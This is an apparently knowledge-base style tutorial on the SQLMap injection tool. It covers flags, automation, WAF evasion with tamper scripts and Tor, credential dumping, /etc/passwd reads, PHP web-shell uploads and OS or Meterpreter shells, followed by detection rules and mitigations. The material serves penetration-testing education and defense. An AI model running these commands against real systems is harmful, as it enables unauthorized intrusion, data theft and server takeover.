---
tool_name: "sqlmap"
display_name: "SQLMap"
mitre_tactic: "initial_access"
mitre_tactic_id: "TA0001"
mitre_subcategory: "sql_injection"
install_command: "sudo apt install sqlmap"
version: "1.10.6"
github_repo: "https://github.com/sqlmapproject/sqlmap"
kali_tools_page: "https://www.kali.org/tools/sqlmap/"
difficulty_level: "beginner-to-advanced"
requires_root: false
gui_available: false
tags: ["web", "sql-injection", "database", "exploitation", "automation"]
related_tools: ["nikto", "burpsuite", "commix", "jsql"]
---

# SQLMap

## Chapter 1: Introduction & Overview

### What is SQLMap?
SQLMap is an open-source penetration testing tool that automates the detection and exploitation of SQL injection vulnerabilities in web applications. It supports a wide range of database management systems including MySQL, Oracle, PostgreSQL, Microsoft SQL Server, SQLite, and many others.

### History & Background
- **Created:** 2006 by Bernardo Damele and Miroslav Štampar
- **Maintained:** SQLMap Project
- **License:** GNU General Public License v2
- **Purpose:** Automate SQL injection detection and exploitation

SQLMap is the industry-standard tool for SQL injection testing. It can detect most types of SQL injection (boolean-based blind, time-based blind, error-based, UNION query-based, and stacked queries) and has powerful features for data extraction, operating system access, and password cracking.

### When to Use This Tool
- **Web application testing:** Find SQL injection vulnerabilities
- **Penetration testing:** Exploit SQL injection flaws
- **Bug bounty:** Discover and report SQL injection
- **CTF challenges:** Solve SQL injection challenges
- **Security audits:** Assess database security

### When NOT to Use This Tool
- Without explicit written authorization from the application owner
- On production databases without careful planning
- For malicious purposes or unauthorized access

### Legal and Ethical Considerations
- **Always get written permission** before testing
- **Understand your scope** - know exactly what you're authorized to test
- **Be careful with --os-shell** - can cause system damage
- **Don't dump entire databases** unless necessary
- **Document everything** - keep records of your activities
- **Follow responsible disclosure** - report vulnerabilities properly

### Key Concepts
- **SQL Injection:** Inserting malicious SQL code into application queries
- **Blind SQL Injection:** When the application doesn't return error messages
- **UNION-based:** Using UNION SELECT to extract data
- **Time-based:** Using timing delays to infer data
- **Error-based:** Using database error messages to extract data
- **Stacked Queries:** Executing multiple SQL statements

### SQL Injection Types
| Type | Description | Detection |
|------|-------------|-----------|
| **Boolean-based blind** | Compare page content based on true/false conditions | `' AND 1=1--` vs `' AND 1=2--` |
| **Time-based blind** | Use timing delays to infer data | `' AND SLEEP(5)--` |
| **Error-based** | Extract data from error messages | `' AND extractvalue(1,1)--` |
| **UNION query** | Use UNION SELECT to combine results | `' UNION SELECT null,null--` |
| **Stacked queries** | Execute multiple statements | `'; DROP TABLE users;--` |
| **Inline queries** |嵌入式 SQL 查询 | `1; SELECT * FROM users` |

---

## Chapter 2: Installation & Setup

### System Requirements
- **Python:** 3.x required
- **Dependencies:** python3-magic
- **Disk Space:** ~10 MB
- **Privileges:** User-level (no root required)

### Installation Methods

#### Method 1: APT (Recommended)
```bash
sudo apt update
sudo apt install sqlmap
```

#### Method 2: From GitHub (Latest Version)
```bash
git clone https://github.com/sqlmapproject/sqlmap.git
cd sqlmap
python3 sqlmap.py --version
```

#### Method 3: Pip
```bash
pip install sqlmap
```

### Configuration
SQLMap stores configuration in:
- **Session files:** `~/.sqlmap/output/`
- **Temporary files:** `/tmp/sqlmap*`
- **Configuration:** `~/.sqlmap/`

### Verification
```bash
sqlmap --version
# Output: 1.10.6
```

---

## Chapter 3: Basic Usage

### First Scan
```bash
sqlmap -u "http://target.com/page?id=1"
```
**Output:** Tests the `id` parameter for SQL injection vulnerabilities.

### Essential Commands

#### Basic URL Testing
```bash
sqlmap -u "http://target.com/page?id=1"
```
**Explanation:** Tests the `id` parameter for SQL injection.

#### POST Data Testing
```bash
sqlmap -u "http://target.com/login" --data="username=admin&password=pass"
```
**Explanation:** Tests POST parameters for SQL injection.

#### With Cookies
```bash
sqlmap -u "http://target.com/page?id=1" --cookie="PHPSESSID=abc123"
```
**Explanation:** Uses session cookie for authenticated testing.

#### Extract Database Names
```bash
sqlmap -u "http://target.com/page?id=1" --dbs
```
**Explanation:** Lists all databases on the server.

### Complete Flags Reference

#### Target Specification
| Flag | Description | Example |
|------|-------------|---------|
| `-u` | Target URL | `sqlmap -u "http://target.com/?id=1"` |
| `-g` | Google dork | `sqlmap -g "inurl:php?id="` |
| `-r` | Request file | `sqlmap -r request.txt` |

#### Request Options
| Flag | Description | Example |
|------|-------------|---------|
| `--data` | POST data | `sqlmap --data="id=1"` |
| `--cookie` | Cookie header | `sqlmap --cookie="session=abc"` |
| `--random-agent` | Random User-Agent | `sqlmap --random-agent` |
| `--proxy` | HTTP proxy | `sqlmap --proxy="http://127.0.0.1:8080"` |
| `--tor` | Use Tor network | `sqlmap --tor` |
| `--check-tor` | Verify Tor | `sqlmap --check-tor` |
| `--headers` | Custom headers | `sqlmap --headers="X-Forwarded-For: 1.1.1.1"` |
| `--auth-type` | Auth type | `sqlmap --auth-type="Basic"` |
| `--auth-cred` | Auth credentials | `sqlmap --auth-cred="admin:pass"` |
| `--delay` | Delay between requests | `sqlmap --delay=1` |
| `--timeout` | Request timeout | `sqlmap --timeout=30` |
| `--retries` | Number of retries | `sqlmap --retries=3` |
| `--randomize` | Randomize parameter | `sqlmap --randomize=id` |
| `--eval` | Evaluate Python code | `sqlmap --eval="import hashlib; hash=hashlib.md5('1').hexdigest()"` |

#### Injection Options
| Flag | Description | Example |
|------|-------------|---------|
| `-p` | Testable parameter | `sqlmap -p id` |
| `--dbms` | Force DBMS | `sqlmap --dbms=mysql` |
| `--privileges` | Enumerate privileges | `sqlmap --privileges` |
| `--is-dba` | Check if DBA | `sqlmap --is-dba` |
| `--level` | Test level (1-5) | `sqlmap --level=5` |
| `--risk` | Risk level (1-3) | `sqlmap --risk=3` |
| `--technique` | SQLi techniques | `sqlmap --technique=BEUSTQ` |
| `--tamper` | Tamper script | `sqlmap --tamper=space2comment` |
| `--prefix` | Injection prefix | `sqlmap --prefix="'"` |
| `--suffix` | Injection suffix | `sqlmap --suffix="-- -"` |
| `--tamper` | Tamper scripts | `sqlmap --tamper=space2comment,between` |

#### Detection Options
| Flag | Description | Example |
|------|-------------|---------|
| `--level` | Test level (1-5) | `sqlmap --level=5` |
| `--risk` | Risk level (1-3) | `sqlmap --risk=3` |
| `--string` | Match string | `sqlmap --string="success"` |
| `--not-string` | Not match string | `sqlmap --not-string="error"` |
| `--regexp` | Match regex | `sqlmap --regexp="success.*"` |
| `--code` | Match HTTP code | `sqlmap --code=200` |
| `--title` | Match title | `sqlmap --title="Login"` |
| `--text` | Match text | `sqlmap --text="Welcome"` |
| `--comments` | Check comments | `sqlmap --comments` |

#### Enumeration Options
| Flag | Description | Example |
|------|-------------|---------|
| `-a` | Retrieve everything | `sqlmap -a` |
| `-b` | Get banner | `sqlmap -b` |
| `--current-user` | Current user | `sqlmap --current-user` |
| `--current-db` | Current database | `sqlmap --current-db` |
| `--hostname` | Hostname | `sqlmap --hostname` |
| `--is-dba` | Check if DBA | `sqlmap --is-dba` |
| `--users` | List users | `sqlmap --users` |
| `--passwords` | User passwords | `sqlmap --passwords` |
| `--privileges` | User privileges | `sqlmap --privileges` |
| `--dbs` | List databases | `sqlmap --dbs` |
| `--tables` | List tables | `sqlmap --tables` |
| `--columns` | List columns | `sqlmap --columns` |
| `--schema` | Database schema | `sqlmap --schema` |
| `--dump` | Dump tables | `sqlmap --dump` |
| `--dump-all` | Dump all tables | `sqlmap --dump-all` |
| `-D` | Database name | `sqlmap -D mydb` |
| `-T` | Table name | `sqlmap -T users` |
| `-C` | Column name | `sqlmap -C password` |
| `--start` | Start row | `sqlmap --start=1` |
| `--stop` | Stop row | `sqlmap --stop=10` |
| `--where` | WHERE clause | `sqlmap --where="id>10"` |

#### File System Access
| Flag | Description | Example |
|------|-------------|---------|
| `--file-read` | Read file | `sqlmap --file-read="/etc/passwd"` |
| `--file-write` | Write file | `sqlmap --file-write="shell.php" --file-dest="/var/www/shell.php"` |
| `--file-esc` | File encoding | `sqlmap --file-esc` |
| `--priv-esc` | Privilege escalation | `sqlmap --priv-esc` |
| `--msf-path` | Metasploit path | `sqlmap --msf-path="/usr/share/metasploit"` |

#### Operating System Access
| Flag | Description | Example |
|------|-------------|---------|
| `--os-shell` | Interactive shell | `sqlmap --os-shell` |
| `--os-pwn` | OOB shell/Meterpreter | `sqlmap --os-pwn` |
| `--os-cmd` | Execute OS command | `sqlmap --os-cmd="whoami"` |
| `--os-bof` | Buffer overflow | `sqlmap --os-bof` |

#### General Options
| Flag | Description | Example |
|------|-------------|---------|
| `--batch` | Non-interactive | `sqlmap --batch` |
| `--flush-session` | Flush session | `sqlmap --flush-session` |
| `--cleanup` | Cleanup DBMS | `sqlmap --cleanup` |
| `--forms` | Parse forms | `sqlmap --forms` |
| `--crawl` | Crawl website | `sqlmap --crawl=3` |
| `--crawl-depth` | Crawl depth | `sqlmap --crawl-depth=2` |
| `--wizard` | Wizard mode | `sqlmap --wizard` |
| `-v` | Verbosity level | `sqlmap -v 6` |

#### Output Options
| Flag | Description | Example |
|------|-------------|---------|
| `-v` | Verbosity (0-6) | `sqlmap -v 6` |
| `--output-dir` | Output directory | `sqlmap --output-dir="/tmp/sqlmap"` |
| `--session` | Session file | `sqlmap --session="session.sqlite"` |

---

## Chapter 4: Intermediate Usage

### Advanced Detection Techniques

#### Increase Detection Level
```bash
# Level 5 tests all parameters including cookies
sqlmap -u "http://target.com/" --cookie="session=abc" --level=5 --risk=3

# Test specific parameters
sqlmap -u "http://target.com/" -p id --level=5
```

#### Custom Detection
```bash
# Match specific string
sqlmap -u "http://target.com/?id=1" --string="Welcome"

# Match HTTP code
sqlmap -u "http://target.com/?id=1" --code=200

# Match title
sqlmap -u "http://target.com/?id=1" --title="Admin Panel"
```

### Scripting & Automation

#### Bash Scripting
```bash
#!/bin/bash
# Batch test multiple URLs
URLS_FILE="urls.txt"
OUTPUT_DIR="sqlmap_results"
mkdir -p $OUTPUT_DIR

while IFS= read -r url; do
    echo "[*] Testing $url"
    sqlmap -u "$url" --batch --dbs --output-dir="$OUTPUT_DIR" 2>&1 | tee -a results.txt
done < "$URLS_FILE"
```

#### Python Scripting
```python
#!/usr/bin/env python3
import subprocess
import json

def test_sqlmap(url, options=None):
    """Run sqlmap and return results"""
    cmd = ['sqlmap', '-u', url, '--batch', '--forms']
    if options:
        cmd.extend(options)
    
    result = subprocess.run(cmd, capture_output=True, text=True)
    return result.stdout

# Test a URL
output = test_sqlmap("http://target.com/?id=1", ['--dbs', '--dump'])
print(output)
```

#### Using Request Files
```bash
# Capture request in Burp Suite, save as request.txt
sqlmap -r request.txt --batch

# Test specific parameter
sqlmap -r request.txt -p id --batch

# Test with level 5
sqlmap -r request.txt --level=5 --risk=3 --batch
```

### Combining with Other Tools

#### With Burp Suite
```bash
# Use proxy from Burp
sqlmap -u "http://target.com/?id=1" --proxy="http://127.0.0.1:8080"

# Use request file from Burp
sqlmap -r burp_request.txt --batch
```

#### With Nikto
```bash
# Find potential injection points with nikto
nikto -h target.com -o nikto_results.txt

# Test identified parameters with sqlmap
grep "Parameter:" nikto_results.txt | awk '{print $2}' | while read param; do
    sqlmap -u "http://target.com/?$param=test" --batch --dbs
done
```

#### With Metasploit
```bash
# Generate shell with sqlmap
sqlmap -u "http://target.com/?id=1" --os-shell

# Use meterpreter shell
sqlmap -u "http://target.com/?id=1" --os-pwn --msf-path="/usr/share/metasploit"
```

### Tamper Scripts

#### Common Tamper Scripts
| Script | Description |
|--------|-------------|
| `space2comment` | Replace spaces with comments |
| `between` | Replace BETWEEN with > AND < |
| `charencode` | URL encode all characters |
| `charunicodeencode` | Unicode encode all characters |
| `equaltolike` | Replace = with LIKE |
| `greatest` | Replace > with GREATEST |
| `halfversionedmorekeywords` | Comment bypass for MySQL |
| `modsecurityversioned` | Comment bypass for ModSecurity |
| `space2comment` | Replace space with comment |
| `space2hash` | Replace space with hash |
| `space2plus` | Replace space with + |
| `space2randomblank` | Replace space with random blank |
| `unionalltounion` | Replace UNION ALL with UNION |

#### Using Tamper Scripts
```bash
# Single tamper script
sqlmap -u "http://target.com/?id=1" --tamper=space2comment

# Multiple tamper scripts
sqlmap -u "http://target.com/?id=1" --tamper=space2comment,between,charencode

# List available tamper scripts
sqlmap --list-tampers
```

#### Custom Tamper Script
```python
#!/usr/bin/env python3
# tamper/custom_tamper.py

def tamper(payload, **kwargs):
    """
    Custom tamper script
    Replace ' ' with '/**/'
    """
    return payload.replace(' ', '/**/')
```

```bash
# Use custom tamper script
sqlmap -u "http://target.com/?id=1" --tamper=custom_tamper
```

### Advanced Output Processing

#### Export to Different Formats
```bash
# CSV output
sqlmap -u "http://target.com/?id=1" --dump -D mydb -T users --dump-format=CSV

# HTML output
sqlmap -u "http://target.com/?id=1" --dump -D mydb -T users --dump-format=HTML
```

#### Session Management
```bash
# Resume a session
sqlmap -u "http://target.com/?id=1" --session="session.sqlite"

# Flush session
sqlmap -u "http://target.com/?id=1" --flush-session
```

---

## Chapter 5: Advanced Usage

### Advanced Injection Techniques

#### Custom Injection Point
```bash
# Custom injection in URL
sqlmap -u "http://target.com/page*?id=1" --prefix="'" --suffix="-- -"

# Custom injection in POST data
sqlmap -u "http://target.com/login" --data="username=admin*&password=pass" --prefix="' OR 1=1--"
```

#### Bypassing WAF/IDS
```bash
# Use tamper scripts
sqlmap -u "http://target.com/?id=1" --tamper=space2comment,between,charencode

# Random User-Agent
sqlmap -u "http://target.com/?id=1" --random-agent

# Use Tor
sqlmap -u "http://target.com/?id=1" --tor --check-tor

# Delay between requests
sqlmap -u "http://target.com/?id=1" --delay=1

# Custom prefix/suffix
sqlmap -u "http://target.com/?id=1" --prefix="' OR '" --suffix="'--'"
```

### Integration in Pentest Workflow

#### Phase 1: Discovery
```bash
# Web crawling
sqlmap -u "http://target.com" --crawl=3 --forms

# Google dorking
sqlmap -g "inurl:php?id= site:target.com"
```

#### Phase 2: Testing
```bash
# Test identified parameters
sqlmap -u "http://target.com/page?id=1" --level=5 --risk=3

# Test with different techniques
sqlmap -u "http://target.com/?id=1" --technique=BEUSTQ
```

#### Phase 3: Exploitation
```bash
# Extract databases
sqlmap -u "http://target.com/?id=1" --dbs

# Extract tables
sqlmap -u "http://target.com/?id=1" -D mydb --tables

# Extract data
sqlmap -u "http://target.com/?id=1" -D mydb -T users --dump

# Get OS shell
sqlmap -u "http://target.com/?id=1" --os-shell
```

### OS Command Execution

#### Get Interactive Shell
```bash
sqlmap -u "http://target.com/?id=1" --os-shell
# Select web application language (PHP, ASP, etc.)
# Then execute commands
```

#### Get Meterpreter Shell
```bash
sqlmap -u "http://target.com/?id=1" --os-pwn --msf-path="/usr/share/metasploit"
```

#### Execute Single Command
```bash
sqlmap -u "http://target.com/?id=1" --os-cmd="whoami"
sqlmap -u "http://target.com/?id=1" --os-cmd="cat /etc/passwd"
```

### File Operations

#### Read Files
```bash
sqlmap -u "http://target.com/?id=1" --file-read="/etc/passwd"
sqlmap -u "http://target.com/?id=1" --file-read="C:\\Windows\\System32\\drivers\\etc\\hosts"
```

#### Write Files
```bash
# Write a PHP shell
sqlmap -u "http://target.com/?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
```

### Advanced Configurations

#### Custom Configuration File
```bash
# Create custom config
cat > /tmp/sqlmap_config.conf << EOF
--level=5
--risk=3
--batch
--random-agent
--tamper=space2comment,between
EOF

# Use config file
sqlmap -u "http://target.com/?id=1" --config-file=/tmp/sqlmap_config.conf
```

#### Environment Variables
```bash
# Set custom output directory
export SQLMAP_OUTPUT_DIR="/tmp/sqlmap"
sqlmap -u "http://target.com/?id=1"
```

### Performance Optimization

#### Parallel Testing
```bash
# Test multiple parameters in parallel
sqlmap -u "http://target.com/?id=1&name=test" --batch --dbs &
sqlmap -u "http://target.com/?page=1&cat=1" --batch --dbs &
wait
```

#### Reduce Request Time
```bash
# Skip specific tests
sqlmap -u "http://target.com/?id=1" --skip="time-based"
```

---

## Chapter 6: Real-World Scenarios

### Scenario 1: Bug Bounty
**Objective:** Find SQL injection vulnerabilities in a web application

**Steps:**
```bash
# 1. Crawl the website
sqlmap -u "http://target.com" --crawl=3 --forms --batch

# 2. Test identified parameters
sqlmap -u "http://target.com/page?id=1" --level=5 --risk=3 --batch

# 3. Extract databases
sqlmap -u "http://target.com/page?id=1" --dbs --batch

# 4. Extract sensitive data
sqlmap -u "http://target.com/page?id=1" -D users -T credentials --dump --batch

# 5. Document findings
```

### Scenario 2: CTF Challenge
**Objective:** Exploit SQL injection to get admin access

**Steps:**
```bash
# 1. Basic testing
sqlmap -u "http://challenge.com/login?user=admin&pass=test" --batch

# 2. Extract database
sqlmap -u "http://challenge.com/login?user=admin&pass=test" --dbs

# 3. Find admin table
sqlmap -u "http://challenge.com/login?user=admin&pass=test" -D ctf --tables

# 4. Extract credentials
sqlmap -u "http://challenge.com/login?user=admin&pass=test" -D ctf -T users --dump

# 5. Get OS shell if needed
sqlmap -u "http://challenge.com/login?user=admin&pass=test" --os-shell
```

### Scenario 3: Penetration Test
**Objective:** Test a web application for SQL injection

**Steps:**
```bash
# 1. Spider the application
sqlmap -u "http://intranet.company.com" --crawl=5 --forms --batch --output-dir=/tmp/sqlmap

# 2. Test all parameters
sqlmap -r /tmp/sqlmap/request.txt --level=5 --risk=3 --batch

# 3. Extract sensitive data
sqlmap -r /tmp/sqlmap/request.txt -D hr_database -T employees --dump --batch

# 4. Check for privilege escalation
sqlmap -r /tmp/sqlmap/request.txt --is-dba --privileges --batch

# 5. Attempt OS access
sqlmap -r /tmp/sqlmap/request.txt --os-shell --batch

# 6. Document all findings
```

---

## Chapter 7: Detection & Defense

### How Defenders Detect SQLMap

#### Network Signatures
```
# SQLMap User-Agent patterns
User-Agent: sqlmap/*
User-Agent: Mozilla/5.0 (compatible; sqlmap/*

# Common SQL injection patterns in requests
?id=1'
?id=1 AND 1=1
?id=1 UNION SELECT
?id=1' OR '1'='1
```

#### Web Server Logs
```bash
# Look for SQL injection attempts
grep -E "UNION|SELECT|DROP|INSERT|UPDATE|DELETE|OR.*=|AND.*=" /var/log/apache2/access.log

# Look for sqlmap patterns
grep -i "sqlmap\|' OR\|' AND\|UNION SELECT" /var/log/apache2/access.log
```

#### IDS/IPS Rules
```
# Snort rules for SQL injection
alert http any any -> $HOME_NET any (msg:"SQL Injection Attempt"; 
  content:"UNION SELECT"; sid:1000001;)

alert http any any -> $HOME_NET any (msg:"SQLMap User-Agent"; 
  content:"User-Agent|3a| sqlmap"; sid:1000002;)
```

### Mitigation Strategies

#### Input Validation
```python
# Python example
import re

def validate_input(user_input):
    """Validate user input"""
    # Allow only alphanumeric characters
    if re.match(r'^[a-zA-Z0-9]+$', user_input):
        return True
    return False

# Use parameterized queries
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
```

#### Parameterized Queries (PHP)
```php
// Bad - vulnerable to SQLi
$query = "SELECT * FROM users WHERE id = " . $_GET['id'];

// Good - parameterized query
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$_GET['id']]);
```

#### WAF Rules
```bash
# ModSecurity rules
SecRule REQUEST_URI|REQUEST_BODY|REQUEST_HEADERS "@rx (?i)(union|select|insert|update|delete|drop|alter|create|exec|execute)" \
  "id:1001,phase:2,block,msg:'SQL Injection Attempt'"
```

#### Rate Limiting
```bash
# nginx rate limiting
limit_req_zone $binary_remote_addr zone=sqlmap:10m rate=10r/s;

location / {
    limit_req zone=sqlmap burst=20 nodelay;
}
```

### Blue Team Response
1. **Monitor logs** - Watch for SQL injection patterns
2. **Analyze WAF logs** - Review blocked requests
3. **Check for data exfiltration** - Look for unusual queries
4. **Review database logs** - Check for unauthorized access
5. **Document the incident** - Record all findings
6. **Patch vulnerabilities** - Fix the root cause

---

## Chapter 8: Troubleshooting

### Common Errors

#### Error: "No parameter found to test"
**Cause:** sqlmap couldn't identify injectable parameters
**Solution:**
```bash
# Specify parameter manually
sqlmap -u "http://target.com/?id=1" -p id

# Try with level 5
sqlmap -u "http://target.com/?id=1" --level=5

# Test POST data
sqlmap -u "http://target.com/login" --data="username=admin&password=pass"
```

#### Error: "Connection refused"
**Cause:** Target server is not responding
**Solution:**
```bash
# Check if target is accessible
curl -I http://target.com

# Try with different user-agent
sqlmap -u "http://target.com/?id=1" --random-agent

# Increase timeout
sqlmap -u "http://target.com/?id=1" --timeout=60
```

#### Error: "302 Redirect"
**Cause:** Application is redirecting (possibly to login page)
**Solution:**
```bash
# Follow redirects
sqlmap -u "http://target.com/?id=1" --redirects

# Use cookies from authenticated session
sqlmap -u "http://target.com/?id=1" --cookie="PHPSESSID=abc123"
```

#### Error: "WAF/IDS detected"
**Cause:** Web Application Firewall is blocking requests
**Solution:**
```bash
# Use tamper scripts
sqlmap -u "http://target.com/?id=1" --tamper=space2comment,between

# Use Tor
sqlmap -u "http://target.com/?id=1" --tor

# Add delays
sqlmap -u "http://target.com/?id=1" --delay=1
```

### Performance Optimization

#### Slow Testing
```bash
# Skip specific tests
sqlmap -u "http://target.com/?id=1" --skip="time-based"

# Use batch mode
sqlmap -u "http://target.com/?id=1" --batch

# Reduce level
sqlmap -u "http://target.com/?id=1" --level=1
```

#### High Resource Usage
```bash
# Use one thread
sqlmap -u "http://target.com/?id=1" --threads=1

# Reduce timeout
sqlmap -u "http://target.com/?id=1" --timeout=10
```

### FAQ

**Q: Is sqlmap legal to use?**
A: Yes, sqlmap is a legitimate security testing tool. However, using it without authorization is illegal. Always get written permission before testing.

**Q: How do I update sqlmap?**
A: `sudo apt update && sudo apt upgrade sqlmap` or `git pull` if installed from GitHub.

**Q: What's the difference between --level and --risk?**
A: `--level` controls the number of tests (1-5, default 1). `--risk` controls the riskiness of tests (1-3, default 1). Higher levels test more parameters but take longer.

**Q: Can sqlmap bypass WAF?**
A: sqlmap has tamper scripts that can help bypass some WAFs, but modern WAFs are increasingly difficult to bypass. Use `--tamper` scripts and `--random-agent`.

**Q: What databases does sqlmap support?**
A: MySQL, Oracle, PostgreSQL, Microsoft SQL Server, SQLite, Firebird, Sybase, SAP MaxDB, DB2, Informix, and others.

**Q: How do I test POST parameters?**
A: Use `--data` option: `sqlmap -u "http://target.com/login" --data="username=admin&password=pass"`

**Q: Can sqlmap execute OS commands?**
A: Yes, with `--os-shell` or `--os-cmd` options, but only if the database user has sufficient privileges (FILE privilege, DBA, etc.).

---

## Resources

### Official Documentation
- [SQLMap Homepage](https://sqlmap.org/)
- [GitHub Repository](https://github.com/sqlmapproject/sqlmap)
- [SQLMap Wiki](https://github.com/sqlmapproject/sqlmap/wiki)
- [SQLMap Documentation](https://github.com/sqlmapproject/sqlmap#documentation)

### Tutorials
- [SQLMap Tutorial - Beginners Guide](https://www.sqlmap.org/)
- [SQL Injection Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
- [HackTricks SQL Injection](https://book.hacktricks.xyz/pentesting-web/sql-injection)

### Books
- "SQL Injection Attacks and Defense" by Justin Clarke
- "The Web Application Hacker's Handbook" by Dafydd Stuttard
- "Hacking: The Art of Exploitation" by Jon Erickson

### Videos
- [SQLMap Tutorial - HackerSploit](https://www.youtube.com/watch?v=7E2bK8d8-2U)
- [SQLMap Advanced - IppSec](https://www.youtube.com/watch?v=HHhgeZUge9c)
- [SQL Injection - LiveOverflow](https://www.youtube.com/watch?v=ciKXiHMOaC4)

### Related Tools
- **nikto:** Web server scanner
- **burpsuite:** Web application testing proxy
- **commix:** Command injection tool
- **jSQL:** Java-based SQL injection tool
- **bbqsql:** Blind SQL injection framework
- **jsql:** SQL injection tool

### Practice Resources
- [DVWA](https://github.com/digininja/DVWA) - Damn Vulnerable Web Application
- [WebGoat](https://github.com/WebGoat/WebGoat) - OWASP WebGoat
- [HackTheBox](https://www.hackthebox.com/) - CTF platform
- [TryHackMe](https://tryhackme.com/) - Learning platform
- [VulnHub](https://www.vulnhub.com/) - Vulnerable VMs

### Certifications That Use SQLMap
- OSCP (Offensive Security Certified Professional)
- CEH (Certified Ethical Hacker)
- GPEN (GIAC Penetration Tester)
- PNPT (Practical Network Penetration Tester)
- CompTIA PenTest+
